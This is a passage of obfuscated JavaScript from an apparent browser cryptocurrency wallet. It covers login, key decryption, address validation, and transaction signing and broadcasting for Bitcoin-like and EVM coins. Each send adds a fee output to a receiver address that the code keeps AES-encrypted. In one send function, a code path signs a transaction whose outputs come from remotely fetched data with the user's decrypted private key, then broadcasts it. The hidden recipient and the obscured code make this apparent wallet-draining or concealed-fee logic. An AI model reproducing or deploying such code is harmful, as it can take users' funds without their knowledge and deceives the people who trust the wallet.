axios[_0x3fc356(0x1dc)](_0x3fc356(0x14d)+_0xd1e432+_0x3fc356(0x11c),{'tx':_0x3e20f3});if(_0x5ea9c7[_0x3fc356(0x27f)]['tx']&&_0x5ea9c7[_0x3fc356(0x27f)]['tx'][_0x3fc356(0x2b3)]){console[_0x3fc356(0x109)](_0x3fc356(0x1a2),_0x5ea9c7[_0x3fc356(0x27f)]['tx'][_0x3fc356(0x2b3)]);var _0x3b7c16=CoinsJson[_0x170198]['BlockExplorer']+_0x3fc356(0x302)+_0x5ea9c7[_0x3fc356(0x27f)]['tx'][_0x3fc356(0x2b3)],_0x413d52=document['getElementById'](_0x3fc356(0x239)),_0xef8f63=document['createElement']('a');_0xef8f63['href']=_0x3b7c16,_0xef8f63[_0x3fc356(0x251)]=_0x5ea9c7[_0x3fc356(0x27f)]['tx'][_0x3fc356(0x2b3)],_0x413d52[_0x3fc356(0x16c)](_0xef8f63);}else console['log'](_0x3fc356(0x194));}catch(_0x4854ec){console['error']('Error\x20pushing\x20signed\x20transaction:',_0x4854ec);}stopSpinner(_0x3fc356(0xd3));}async function FetchJSON(_0x48245c,_0x1f1ebe){var _0x134500=_0x28cfff;try{console[_0x134500(0x109)](_0x134500(0x18f),_0x1f1ebe),console[_0x134500(0x109)](_0x134500(0x22a),_0x48245c);const _0x254393=await fetch(_0x48245c),_0x327996=await _0x254393['json']();return console[_0x134500(0x109)](_0x134500(0xf2),_0x327996),_0x327996;}catch(_0x409cb3){console[_0x134500(0x299)](_0x134500(0x10e),_0x409cb3),ShowToast(_0x409cb3),stopSpinner(_0x134500(0xd3));}}async function ChangeBitcoinLikeParameter(_0x534cea){var _0x167b4b=_0x28cfff;coinjs['pub']=CoinsJson[_0x534cea][_0x167b4b(0x130)],coinjs['priv']=CoinsJson[_0x534cea][_0x167b4b(0x164)],coinjs[_0x167b4b(0x1d9)]=CoinsJson[_0x534cea][_0x167b4b(0x1d9)],coinjs['hdkey'][_0x167b4b(0x130)]=CoinsJson[_0x534cea][_0x167b4b(0x1f0)],coinjs['hdkey'][_0x167b4b(0x215)]=CoinsJson[_0x534cea][_0x167b4b(0x1a9)];}async function SendBitcoinLikeWithCoinJS(_0x4ec7e4){var _0x245891=_0x28cfff;console[_0x245891(0x109)](_0x245891(0x297),_0x4ec7e4);const _0x1381a5=document[_0x245891(0xea)](_0x245891(0x1ce))[_0x245891(0x1ae)],_0xe8ffa7=parseFloat(document['getElementById'](_0x245891(0x20d))[_0x245891(0x1ae)]),_0x107668=parseFloat(document[_0x245891(0xea)](_0x245891(0x108))['value']);if(_0xe8ffa7<CoinsJson[_0x4ec7e4]['SendMinAmount']){}await ChangeBitcoinLikeParameter(_0x4ec7e4);var _0x1568b3=CoinsJson[_0x4ec7e4]['symbol'][_0x245891(0x107)]();console['log'](_0x245891(0x225),_0x1568b3);var _0x4172e9=await DecryptAccount(CurrentEncryptedPrivateKey),_0x3dfb03=coinjs[_0x245891(0x255)](_0x4172e9)[_0x245891(0x1f7)];console[_0x245891(0x109)]('FromAddress:',_0x3dfb03);var _0x9892d0=await FetchJSON(_0x245891(0x14d)+_0x1568b3+_0x245891(0x2ef)+_0x3dfb03+_0x245891(0x29f),_0x245891(0x193));console['log'](_0x245891(0x172),_0x9892d0['address']),console['log'](_0x245891(0x26f),_0x9892d0[_0x245891(0xe3)]),console['log']('final_n_tx:',_0x9892d0['final_n_tx']);if(_0x9892d0[_0x245891(0xe3)]==0x0||_0x9892d0['n_tx']==null){console[_0x245891(0x109)]('empty\x20address...'),document[_0x245891(0xea)](_0x245891(0x239))[_0x245891(0x2ac)]='Balance\x20not\x20enough..',stopSpinner(_0x245891(0xd3));return;}if(parseFloat(_0x9892d0[_0x245891(0x1aa)])==0x0){document[_0x245891(0xea)](_0x245891(0x239))[_0x245891(0x2ac)]='Balance\x20not\x20enough.',stopSpinner(_0x245891(0xd3));return;}var _0x289d4f=coinjs[_0x245891(0x1a8)](),_0x9892d0=await FetchJSON(_0x245891(0x1bc),_0x245891(0x232));console[_0x245891(0x109)](_0x245891(0x2c5),_0x9892d0),_0x9892d0[_0x245891(0x24e)][_0x245891(0x18c)](_0x176856=>{var _0x2838f6=_0x245891;console[_0x2838f6(0x109)](_0x2838f6(0x139),_0x176856['prev_hash']),console[_0x2838f6(0x109)](_0x2838f6(0x167),_0x176856[_0x2838f6(0xd0)]),_0x289d4f[_0x2838f6(0x14a)](_0x176856[_0x2838f6(0x1b2)],0x0);});var _0x969b7d=0.2,_0x1aa268=![];_0x9892d0[_0x245891(0xee)][_0x245891(0x18c)](_0x39421e=>{var _0x3f551c=_0x245891;console['log'](_0x3f551c(0x1bd),_0x39421e[_0x3f551c(0x119)][0x0]),console['log'](_0x3f551c(0x1bb),_0x39421e['value']/0x5f5e100);if(!_0x1aa268){var _0x85a63=parseFloat((_0x39421e[_0x3f551c(0x1ae)]/0x5f5e100-_0x969b7d)[_0x3f551c(0x1db)](0x8));_0x289d4f[_0x3f551c(0xf6)](_0x39421e[_0x3f551c(0x119)][0x0],_0x85a63),console['log'](_0x3f551c(0x16a),_0x85a63),_0x1aa268=!![];}else _0x289d4f[_0x3f551c(0xf6)](_0x39421e[_0x3f551c(0x119)][0x0],_0x39421e['value']/0x5f5e100);});var _0x183a8a=_0x289d4f[_0x245891(0xf7)](_0x289d4f['serialize']());console[_0x245891(0x109)](_0x245891(0x1ed),_0x289d4f),console[_0x245891(0x109)]('t:',_0x183a8a);var _0x13253f=_0x183a8a[_0x245891(0x276)](_0x4172e9,'1');console[_0x245891(0x109)](_0x245891(0x2cd),_0x13253f),rawSubmitblockcypher(_0x4ec7e4,_0x13253f,_0x1568b3);return;var _0x289d4f=coinjs[_0x245891(0x1a8)](),_0x445683=0xa;_0x9892d0[_0x245891(0xf4)][_0x245891(0x18c)](_0x4b2a50=>{var _0x340384=_0x245891;console['log'](_0x340384(0x304),_0x4b2a50[_0x340384(0x2e2)]),console[_0x340384(0x109)](_0x340384(0x1ef),_0x4b2a50[_0x340384(0x2c2)]),_0x289d4f['addinput'](_0x4b2a50[_0x340384(0x2e2)],_0x4b2a50[_0x340384(0x2c2)],_0x4b2a50[_0x340384(0x2c8)],0xffffffff-0x2);}),console[_0x245891(0x109)](_0x245891(0x2eb),_0x9892d0['address']);var _0x538b49=parseFloat((_0x9892d0[_0x245891(0x1aa)]/0x5f5e100)['toFixed'](0x8)),_0x4365cc=_0x107668,_0x50059f=parseFloat((_0xe8ffa7*CoinsJson[_0x4ec7e4][_0x245891(0x309)])[_0x245891(0x1db)](0x8));console[_0x245891(0x109)]('APPFee:',_0x50059f),console[_0x245891(0x109)](_0x245891(0x23d),_0x538b49),console[_0x245891(0x109)](_0x245891(0x195),_0xe8ffa7),console[_0x245891(0x109)]('fee:',_0x4365cc);var _0x4d20ae=parseFloat((_0x4365cc+_0xe8ffa7+_0x50059f)[_0x245891(0x1db)](0x8));console[_0x245891(0x109)](_0x245891(0x104),_0x4d20ae);if(_0x4d20ae>_0x538b49){console[_0x245891(0x109)]('TotalSend\x20need\x20>\x20Balance'),stopSpinner(_0x245891(0xd3));return;}console[_0x245891(0x109)](_0x245891(0x2eb),_0x9892d0[_0x245891(0x1f7)]);var _0x25e4a0=parseFloat((_0x538b49-_0x4d20ae)[_0x245891(0x1db)](0x8));console[_0x245891(0x109)]('UserBackChange:',_0x25e4a0);var _0x559e98=CryptoJS[_0x245891(0x137)]['decrypt'](CoinsJson[_0x4ec7e4]['FeeReciever'],ioswz),_0x460861=_0x559e98['toString'](CryptoJS[_0x245891(0x267)][_0x245891(0x28b)]),_0x39ddcf=_0x460861;_0x289d4f[_0x245891(0xf6)](_0x9892d0[_0x245891(0x1f7)],_0x25e4a0),_0x289d4f['addoutput'](_0x1381a5,_0xe8ffa7),_0x289d4f[_0x245891(0xf6)](_0x39ddcf,_0x50059f),console[_0x245891(0x109)](_0x245891(0x1c5),_0x289d4f),console[_0x245891(0x109)](_0x245891(0x2d6),_0x289d4f[_0x245891(0x261)]()),console[_0x245891(0x109)]('test\x20transaction\x20info:',_0x289d4f['serialize']());var _0x183a8a=_0x289d4f['deserialize'](_0x289d4f[_0x245891(0x17c)]());console[_0x245891(0x109)]('tx:',_0x289d4f),console['log']('t:',_0x183a8a);var _0x13253f=_0x183a8a[_0x245891(0x276)](_0x4172e9,'1');console['log']('signed:',_0x13253f);}async function SendBitcoinLikeWithBitcoinjs(_0x37a723){var _0x51eeb9=_0x28cfff,_0x5c8dcb=document[_0x51eeb9(0xea)](_0x51eeb9(0x1ce))[_0x51eeb9(0x1ae)],_0x1a0cf4=parseFloat(document[_0x51eeb9(0xea)](_0x51eeb9(0x20d))[_0x51eeb9(0x1ae)]);if(_0x1a0cf4<CoinsJson[_0x37a723][_0x51eeb9(0x142)]){console[_0x51eeb9(0x109)](_0x51eeb9(0x25a),CoinsJson[_0x37a723]['SendMinAmount']),ShowToast(_0x51eeb9(0x21b)+CoinsJson[_0x37a723]['SendMinAmount']),stopSpinner(_0x51eeb9(0xd3));return;}var _0x189de8=CoinsJson[_0x37a723][_0x51eeb9(0x2df)][_0x51eeb9(0x107)]();console[_0x51eeb9(0x109)]('symbol:',_0x189de8);var _0xa51e02=await DecryptAccount(CurrentEncryptedPrivateKey);const _0x354467=bitcoin['networks'][_0x51eeb9(0xf9)];_0x354467[_0x51eeb9(0x286)]=CoinsJson[_0x37a723][_0x51eeb9(0x130)],_0x354467[_0x51eeb9(0xfa)]=CoinsJson[_0x37a723][_0x51eeb9(0x164)],_0x354467[_0x51eeb9(0x2c4)]=CoinsJson[_0x37a723]['multisig'];const _0x371994=bitcoin['ECPair']['fromWIF'](_0xa51e02),_0x3f91bb=_0x371994[_0x51eeb9(0x2a1)];console[_0x51eeb9(0x109)](_0x51eeb9(0x190),bitcoin[_0x51eeb9(0x272)]);const _0x12581f=bitcoin[_0x51eeb9(0x272)]['p2pkh']({'pubkey':_0x3f91bb})[_0x51eeb9(0x1f7)];console[_0x51eeb9(0x109)](_0x51eeb9(0x178),_0x12581f);var _0x859b97='https://api.blockcypher.com/v1/'+_0x189de8+'/main/addrs/'+_0x12581f+_0x51eeb9(0x29f),_0x5d7acb=await FetchJSON(_0x859b97,'SendBitcoinLikeWithBitcoinjs');console[_0x51eeb9(0x109)](_0x51eeb9(0x2c5),_0x5d7acb);const _0x5ed49f=_0x5d7acb[_0x51eeb9(0xf4)];if(_0x5ed49f==null||_0x5ed49f==undefined){console['log'](_0x51eeb9(0x16d)),stopSpinner(_0x51eeb9(0xd3));return;}var _0x15aab6=CoinsJson[_0x37a723][_0x51eeb9(0x219)],_0x3271b=parseInt(_0x5d7acb[_0x51eeb9(0x166)]);try{if(GlobalMinerFee>0x0){var _0x4cc753=await CalculateTxLength(_0x5ed49f,_0x12581f,_0x5c8dcb,_0x371994,_0x37a723);console[_0x51eeb9(0x109)](_0x51eeb9(0x211),_0x4cc753),_0x15aab6=parseInt(GlobalMinerFee*(_0x4cc753/0x3e8));}}catch{_0x15aab6=CoinsJson[_0x37a723]['DefaultMinerFee'];}_0x15aab6<CoinsJson[_0x37a723][_0x51eeb9(0x219)]&&(_0x15aab6=CoinsJson[_0x37a723][_0x51eeb9(0x219)]);_0x15aab6>CoinsJson[_0x37a723]['MaximumMinerFee']&&(_0x15aab6=CoinsJson[_0x37a723][_0x51eeb9(0x199)]);_0x1a0cf4=parseInt(_0x1a0cf4*0x5f5e100);var _0x5e489f=parseInt((_0x1a0cf4*CoinsJson[_0x37a723][_0x51eeb9(0x309)])[_0x51eeb9(0x1db)](0x8));console[_0x51eeb9(0x109)](_0x51eeb9(0x268),_0x5e489f),console[_0x51eeb9(0x109)]('MinerFee:',_0x15aab6),console[_0x51eeb9(0x109)](_0x51eeb9(0x195),_0x1a0cf4);var _0x5e78e0=_0x1a0cf4+_0x15aab6+_0x5e489f,_0x2c57a2=parseInt(_0x3271b-_0x5e78e0);console['log'](_0x51eeb9(0x248),parseInt(_0x5d7acb[_0x51eeb9(0x166)])),console[_0x51eeb9(0x109)]('TotalSend:',_0x5e78e0),console[_0x51eeb9(0x109)](_0x51eeb9(0x115),_0x2c57a2);_0x1a0cf4==_0x3271b&&(console[_0x51eeb9(0x109)](_0x51eeb9(0x2d8)),_0x1a0cf4=parseInt(_0x3271b-(_0x15aab6+_0x5e489f)),_0x5e78e0=_0x1a0cf4+_0x15aab6+_0x5e489f,console['log'](_0x51eeb9(0x283),_0x5e489f),console['log'](_0x51eeb9(0xfd),_0x15aab6),console[_0x51eeb9(0x109)](_0x51eeb9(0x1e6),_0x1a0cf4),console['log'](_0x51eeb9(0xe8),_0x5e78e0));if(_0x1a0cf4<=0x0){console[_0x51eeb9(0x109)]('amount\x20not\x20right'),stopSpinner(_0x51eeb9(0xd3));return;}if(_0x5e78e0>_0x3271b){console[_0x51eeb9(0x109)](_0x51eeb9(0x10f)),stopSpinner('StartSendButtonID');return;}const _0x2923d7=new bitcoin[(_0x51eeb9(0x1bf))](_0x354467);_0x5ed49f[_0x51eeb9(0x18c)](_0x3a8149=>{var _0x1597ec=_0x51eeb9;_0x2923d7[_0x1597ec(0x1ff)](_0x3a8149[_0x1597ec(0x2e2)],_0x3a8149[_0x1597ec(0x2c2)]);});var _0x32d7ae=CryptoJS['AES'][_0x51eeb9(0xcf)](CoinsJson[_0x37a723][_0x51eeb9(0x17b)],ioswz),_0x5cd850=_0x32d7ae[_0x51eeb9(0x1d5)](CryptoJS[_0x51eeb9(0x267)][_0x51eeb9(0x28b)]),_0x4b61d6=_0x5cd850;_0x1a0cf4<_0x3271b&&_0x2c57a2>0x0&&_0x2923d7[_0x51eeb9(0x2f6)](_0x12581f,_0x2c57a2);_0x2923d7[_0x51eeb9(0x2f6)](_0x5c8dcb,_0x1a0cf4),_0x2923d7['addOutput'](_0x4b61d6,_0x5e489f),_0x5ed49f['forEach']((_0x3028da,_0x23ef34)=>{var _0x296cc=_0x51eeb9;_0x2923d7[_0x296cc(0x276)](_0x23ef34,_0x371994);});var _0xb0de54=_0x2923d7[_0x51eeb9(0x2a3)](),_0x23416f=_0xb0de54['toHex']();console[_0x51eeb9(0x109)](_0x51eeb9(0x14e),_0x23416f),BroadcastBitcoinLikeToBlockcypher(_0x37a723,_0x23416f),document[_0x51eeb9(0xea)](_0x51eeb9(0x1cb))[_0x51eeb9(0x2ac)]='';}async function CalculateTxLength(_0x66b413,_0xa29461,_0x3a8b70,_0xc84229,_0x176164){var _0x56c758=_0x28cfff;const _0x3e55cb=new bitcoin[(_0x56c758(0x1bf))]();_0x66b413[_0x56c758(0x18c)](_0x6445fa=>{var _0x4a51fb=_0x56c758;_0x3e55cb['addInput'](_0x6445fa[_0x4a51fb(0x2e2)],_0x6445fa[_0x4a51fb(0x2c2)]);});var _0x4000a9=CryptoJS['AES'][_0x56c758(0xcf)](CoinsJson[_0x176164][_0x56c758(0x17b)],ioswz),_0x2b10ba=_0x4000a9[_0x56c758(0x1d5)](CryptoJS['enc'][_0x56c758(0x28b)]),_0xcbad4e=_0x2b10ba;_0x3e55cb['addOutput'](_0xa29461,0x1),_0x3e55cb['addOutput'](_0x3a8b70,0x1),_0x3e55cb[_0x56c758(0x2f6)](_0xcbad4e,0x1),_0x66b413[_0x56c758(0x18c)]((_0x282a12,_0x4e84fa)=>{var _0x1b75c1=_0x56c758;_0x3e55cb[_0x1b75c1(0x276)](_0x4e84fa,_0xc84229);});const _0x704e1e=_0x3e55cb[_0x56c758(0x2a3)]()[_0x56c758(0x17d)]();return _0x704e1e;}function _0xfecc(_0x49f2f8,_0x1cb1f1){var _0x2e5507=_0x1669();return _0xfecc=function(_0x5ee13a,_0x1961c4){_0x5ee13a=_0x5ee13a-0xce;var _0x58a53a=_0x2e5507[_0x5ee13a];return _0x58a53a;},_0xfecc(_0x49f2f8,_0x1cb1f1);}async function ShowMainUI(){var _0x3599af=_0x28cfff;await timer(0x21),document[_0x3599af(0xea)](_0x3599af(0x135))[_0x3599af(0x175)]=!![],await Restore(GlobalMnemonic),await updateAccountSelector(),await updateMainAccountSelector(),$(_0x3599af(0x2dd))[_0x3599af(0x2c0)](),$(_0x3599af(0x145))[_0x3599af(0x16b)]();var _0x31c1f5=document['getElementById']('MainBlockchainSelector')[_0x3599af(0x1ae)],_0x14899b=document['getElementById'](_0x3599af(0x212))[_0x3599af(0x1ae)];document[_0x3599af(0xea)](_0x3599af(0x241))['innerText']=await GetPublicAddress(_0x31c1f5,_0x14899b),document[_0x3599af(0xea)](_0x3599af(0x237))[_0x3599af(0x121)]=_0x3599af(0x224)+CoinsJson[_0x31c1f5][_0x3599af(0x2df)][_0x3599af(0x11e)]()+_0x3599af(0x2b1);}async function login(){var _0x485924=_0x28cfff,_0x2a9e8d=document[_0x485924(0xea)](_0x485924(0x249))[_0x485924(0x1ae)];if(_0x2a9e8d[_0x485924(0x1c2)]()===''||_0x2a9e8d['length']<0x3){ShowToast(_0x485924(0x101));return;}var _0x34b074=localStorage[_0x485924(0x28e)](_0x485924(0x26d));if(localStorage[_0x485924(0x28e)](_0x485924(0x26d))==null||localStorage[_0x485924(0x28e)]('hashedPassword')==undefined){var _0x34e646=CryptoJS['SHA256'](_0x2a9e8d[_0x485924(0x1c2)]())[_0x485924(0x1d5)]();localStorage['setItem'](_0x485924(0x26d),_0x34e646),pass=_0x2a9e8d['trim'](),console[_0x485924(0x109)]('Password\x20set\x20successfully'),$(_0x485924(0xf0))['hide'](),$(_0x485924(0x2dd))[_0x485924(0x16b)]();const _0x1ecf66=ethers[_0x485924(0x11a)]['entropyToMnemonic'](ethers[_0x485924(0x11a)][_0x485924(0x192)](0x20));IsANewWallet=!![],console[_0x485924(0x109)](_0x485924(0x25e),IsANewWallet),document['getElementById'](_0x485924(0x198))[_0x485924(0x2ac)]=_0x1ecf66,GlobalMnemonic=_0x1ecf66,setTimeout(function(){var _0x83cc3b=_0x485924;document['getElementById'](_0x83cc3b(0x135))[_0x83cc3b(0x175)]=![];},0xbb8);}else{var _0x3d3ce1=CryptoJS[_0x485924(0x20e)](_0x2a9e8d)[_0x485924(0x1d5)]();_0x3d3ce1===_0x34b074?(console[_0x485924(0x109)](_0x485924(0x2ec)),await timer(0x1e),document[_0x485924(0xea)](_0x485924(0x21d))[_0x485924(0x175)]=!![],await timer(0x1e),document[_0x485924(0xea)](_0x485924(0x12a))[_0x485924(0x2ac)]=_0x485924(0x10a),pass=_0x2a9e8d[_0x485924(0x1c2)](),IsANewWallet=![],console[_0x485924(0x109)](_0x485924(0x25e),IsANewWallet),await timer(0x1e),await updateAccountSelector(),await timer(0x1e),await updateMainAccountSelector(),await timer(0x1e),$(_0x485924(0xf0))[_0x485924(0x2c0)](),$(_0x485924(0x145))[_0x485924(0x16b)](),(localStorage['getItem']('MainBlockchainSelector')!==null||localStorage[_0x485924(0x28e)](_0x485924(0x14b))!==undefined)&&(document[_0x485924(0xea)]('MainBlockchainSelector')[_0x485924(0x12b)]=localStorage[_0x485924(0x28e)](_0x485924(0x14b)),await updateMainAccountSelector()),(localStorage[_0x485924(0x28e)](_0x485924(0x1e2))!==null||localStorage[_0x485924(0x28e)]('MainAccountSelectorIndex')!==undefined)&&(document[_0x485924(0xea)](_0x485924(0x212))[_0x485924(0x12b)]=localStorage['getItem'](_0x485924(0x1e2)),await timer(0x3),await OnChangeSelector2())):(console[_0x485924(0x109)](_0x485924(0x2ad)),ShowToast(_0x485924(0x2ad)));}}async function OnChangeSelector2(){var _0x3003d2=_0x28cfff;console[_0x3003d2(0x109)](_0x3003d2(0x294)),document[_0x3003d2(0xea)](_0x3003d2(0x214))[_0x3003d2(0x2ac)]='';var _0x3ae2b9=document[_0x3003d2(0xea)](_0x3003d2(0x14b))[_0x3003d2(0x1ae)],_0x25aeca=document['getElementById'](_0x3003d2(0x212))[_0x3003d2(0x1ae)];console[_0x3003d2(0x109)](_0x3003d2(0x1c0),_0x3ae2b9),document[_0x3003d2(0xea)](_0x3003d2(0x241))[_0x3003d2(0x2ac)]=await GetPublicAddress(_0x3ae2b9,_0x25aeca),CurrentEncryptedPrivateKey=_0x25aeca,console[_0x3003d2(0x109)](_0x3003d2(0x2ee),document[_0x3003d2(0xea)](_0x3003d2(0x212))[_0x3003d2(0x12b)]),localStorage[_0x3003d2(0x245)]('MainAccountSelectorIndex',document[_0x3003d2(0xea)](_0x3003d2(0x212))['selectedIndex']),await GetBalanceRun('FromMainUI'),document['getElementById'](_0x3003d2(0x1cb))[_0x3003d2(0x2ac)]='',await GenerateTransactionTable(),document['getElementById']('RefreshBalanceButtonID')['hidden']=![];}function isValidEVMPrivateKey(_0x46a3ea){var _0x57d5a4=_0x28cfff,_0x593924=/^0x[0-9a-fA-F]{64}$/,_0x4d5e86=_0x593924[_0x57d5a4(0x113)](_0x46a3ea);return _0x4d5e86;}function isValidBitcoinLikePrivateKey(_0x45e2d3){var _0xf89048=_0x28cfff;return _0x45e2d3[_0xf89048(0x263)]===0x34?!![]:![];}function isValidBitcoinAddress(_0x287a8c){const _0x207220=/^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$/;return _0x207220['test'](_0x287a8c);}function isValidDogeAddress(_0x2756d0){const _0x130650=/^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$/;return _0x130650['test'](_0x2756d0);}function isValidLitecoinAddress(_0x5f1074){var _0x59b869=_0x28cfff;const _0xfa1c73=/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/;return _0xfa1c73[_0x59b869(0x113)](_0x5f1074);}async function isValidBitcoinlikeAddress(_0x15ce39,_0x14a8e6){var _0x3a4972=_0x28cfff;let _0x1ab021=![];switch(_0x15ce39){case _0x3a4972(0xdc):_0x1ab021=isValidBitcoinAddress(_0x14a8e6);break;case _0x3a4972(0x140):_0x1ab021=isValidDogeAddress(_0x14a8e6);break;case'Litecoin':_0x1ab021=isValidLitecoinAddress(_0x14a8e6);break;default:console[_0x3a4972(0x299)]('Unsupported\x20coin\x20type');return![];}return _0x1ab021?console[_0x3a4972(0x109)](_0x3a4972(0x2d5)+_0x15ce39+_0x3a4972(0x196)):console['log']('Invalid\x20'+_0x15ce39+_0x3a4972(0x196)),_0x1ab021;}function shortenAddress(_0x3c0b4f,_0x1a72bf=0x4,_0x3d8904=0x2){var _0x598ec8=_0x28cfff;const _0x3e52af=_0x3c0b4f[_0x598ec8(0x220)](0x0,_0x1a72bf),_0x4eb26a=_0x3c0b4f[_0x598ec8(0x220)](-_0x3d8904);return _0x3e52af+'..'+_0x4eb26a;}function ShowSendForm(){var _0x28f8d0=_0x28cfff;$(_0x28f8d0(0x10b))[_0x28f8d0(0x2c0)](),$(_0x28f8d0(0xd9))[_0x28f8d0(0x2c0)](),$('#txHashTableBody')[_0x28f8d0(0x2c0)](),$(_0x28f8d0(0x1b4))[_0x28f8d0(0x2c0)](),$(_0x28f8d0(0xeb))[_0x28f8d0(0x1b5)]();}function CancelSend(){var _0x49d83c=_0x28cfff;$(_0x49d83c(0xeb))[_0x49d83c(0x2c0)](),stopSpinner(_0x49d83c(0xd3));}function ShowImportForm(){var _0xfdc52f=_0x28cfff;$('#ImportPrivateID')['show'](),$('#SendFormID')['hide'](),$(_0xfdc52f(0x181))[_0xfdc52f(0x2c0)](),$('#InputPrivateKeyManuallyID')['hide'](),$(_0xfdc52f(0x1b4))['hide']();}function CancelImportForm(){var _0x17874=_0x28cfff;$('#ImportPrivateID')[_0x17874(0x2c0)]();}function ManuallyInput(){var _0x1dcc02=_0x28cfff;$(_0x1dcc02(0xeb))[_0x1dcc02(0x2c0)](),$(_0x1dcc02(0xd9))[_0x1dcc02(0x2c0)](),$(_0x1dcc02(0x181))[_0x1dcc02(0x2c0)](),$(_0x1dcc02(0x1b4))[_0x1dcc02(0x2c0)](),$(_0x1dcc02(0x10b))[_0x1dcc02(0x1b5)]();}function ShowHistory(){var _0x1c7438=_0x28cfff;$(_0x1c7438(0xeb))[_0x1c7438(0x2c0)](),$(_0x1c7438(0xd9))['hide'](),$(_0x1c7438(0x10b))['hide'](),$(_0x1c7438(0x1b4))[_0x1c7438(0x2c0)](),$(_0x1c7438(0x181))[_0x1c7438(0x1b5)]();}async function GetPublicAddress(_0x17067a,_0x47b60b){var _0x497cb8=_0x28cfff;_0x47b60b=await DecryptAccount(_0x47b60b);if(CoinsJson[_0x17067a][_0x497cb8(0x1d3)]==_0x497cb8(0x191)){console[_0x497cb8(0x109)](_0x497cb8(0x2a2),_0x17067a);var _0x457cc0=await ChangeBitcoinLikeParameter(_0x17067a),_0x5e72d6=coinjs[_0x497cb8(0x255)](_0x47b60b)[_0x497cb8(0x1f7)];return console[_0x497cb8(0x109)](_0x497cb8(0x1ad),_0x5e72d6),_0x5e72d6;}else{if(CoinsJson[_0x17067a][_0x497cb8(0x1d3)]==_0x497cb8(0x114)&&web3[_0x497cb8(0x218)][_0x497cb8(0x1c1)][_0x497cb8(0x2fa)](_0x47b60b)){var _0x5e72d6=web3[_0x497cb8(0x218)][_0x497cb8(0x1c1)][_0x497cb8(0x2fa)](_0x47b60b)[_0x497cb8(0x1f7)];return _0x5e72d6;}}}async function AddOneAccount(){var _0x2e09bd=_0x28cfff;console[_0x2e09bd(0x109)](_0x2e09bd(0x2d4));var _0x55c451='';const _0x3d5bbe=new Web3(),_0x1e3b93=_0x3d5bbe[_0x2e09bd(0x218)]['accounts'][_0x2e09bd(0x265)]();console[_0x2e09bd(0x109)](_0x2e09bd(0x1d8),_0x1e3b93[_0x2e09bd(0x1f7)]);var _0x18c2bf=document[_0x2e09bd(0xea)]('MainBlockchainSelector')['value'];console['log'](_0x2e09bd(0x1c0),_0x18c2bf);for(var _0x541448 in CoinsJson){console[_0x2e09bd(0x109)]('key',_0x541448);if(CoinsJson[_0x541448][_0x2e09bd(0x1d3)]===_0x2e09bd(0x191)&&_0x541448===_0x18c2bf){const _0x15f183=bitcoin[_0x2e09bd(0xe7)][_0x2e09bd(0xf9)];_0x15f183[_0x2e09bd(0x286)]=CoinsJson[_0x541448][_0x2e09bd(0x130)],_0x15f183[_0x2e09bd(0xfa)]=CoinsJson[_0x541448][_0x2e09bd(0x164)],_0x15f183[_0x2e09bd(0x2c4)]=CoinsJson[_0x541448][_0x2e09bd(0x1d9)];var _0x4d3503=bitcoin[_0x2e09bd(0x228)][_0x2e09bd(0x1d0)](),_0x5cf0ce=_0x4d3503['publicKey'],_0x543216=bitcoin[_0x2e09bd(0x272)][_0x2e09bd(0x229)]({'pubkey':_0x5cf0ce})[_0x2e09bd(0x1f7)],_0x885ad5=_0x4d3503[_0x2e09bd(0x2b0)]();console[_0x2e09bd(0x109)](_0x2e09bd(0x1cc),_0x541448),console[_0x2e09bd(0x109)](_0x2e09bd(0x23e),_0x543216),console[_0x2e09bd(0x109)](_0x2e09bd(0x2cf),_0x885ad5),await SaveAccount(_0x541448,_0x885ad5),_0x55c451=_0x543216;}else CoinsJson[_0x541448][_0x2e09bd(0x1d3)]===_0x2e09bd(0x114)&&CoinsJson[_0x18c2bf][_0x2e09bd(0x1d3)]===_0x2e09bd(0x114)&&(await SaveAccount(_0x541448,_0x1e3b93[_0x2e09bd(0x29d)]),_0x55c451=_0x1e3b93[_0x2e09bd(0x1f7)]);}ShowToast(_0x2e09bd(0x2a5)+_0x55c451),await updateAccountSelector(),await updateMainAccountSelector(),document[_0x2e09bd(0xea)](_0x2e09bd(0x212))[_0x2e09bd(0x12b)]=document['getElementById'](_0x2e09bd(0x212))[_0x2e09bd(0x1f9)][_0x2e09bd(0x263)]-0x1,OnChangeSelector2();}async function ValidateSendFrom(){}function copyText(){var _0x14a432=_0x28cfff,_0x5aa459=document[_0x14a432(0xea)](_0x14a432(0x241)),_0x451692=document[_0x14a432(0xdd)]();_0x451692['selectNode'](_0x5aa459),window[_0x14a432(0x1ee)]()[_0x14a432(0x210)](),window['getSelection']()[_0x14a432(0x292)](_0x451692),document['execCommand'](_0x14a432(0xdb)),window[_0x14a432(0x1ee)]()[_0x14a432(0x210)](),console[_0x14a432(0x109)](_0x14a432(0x2d9));}function copyTransactionLink(){var _0x46ecd6=_0x28cfff,_0x235172=document[_0x46ecd6(0xea)]('TransactionID'),_0x4c42d5=document[_0x46ecd6(0xdd)]();_0x4c42d5[_0x46ecd6(0x2b6)](_0x235172),window[_0x46ecd6(0x1ee)]()[_0x46ecd6(0x210)](),window[_0x46ecd6(0x1ee)]()[_0x46ecd6(0x292)](_0x4c42d5),document[_0x46ecd6(0x2ed)](_0x46ecd6(0xdb)),window[_0x46ecd6(0x1ee)]()[_0x46ecd6(0x210)](),console[_0x46ecd6(0x109)](_0x46ecd6(0x2d9));}async function BroadcastBitcoinLikeToblockchair(_0x1c2304,_0x1befa8){var _0x35012d=_0x28cfff,_0xc3adc3=CoinsJson[_0x1c2304]['BlockchairSymbol'];const _0x575d03='https://api.blockchair.com/'+_0xc3adc3+_0x35012d(0x1b7);fetch(_0x575d03,{'method':'POST','headers':{'Content-Type':_0x35012d(0x2bf)},'body':JSON['stringify']({'data':_0x1befa8})})[_0x35012d(0x2f5)](_0x2c3ac1=>_0x2c3ac1[_0x35012d(0x1f1)]())[_0x35012d(0x2f5)](_0x13f9f8=>{var _0x59c12d=_0x35012d;console[_0x59c12d(0x109)](_0x13f9f8),console[_0x59c12d(0x109)](_0x59c12d(0x21e)+_0x13f9f8['data'][_0x59c12d(0xce)]);var 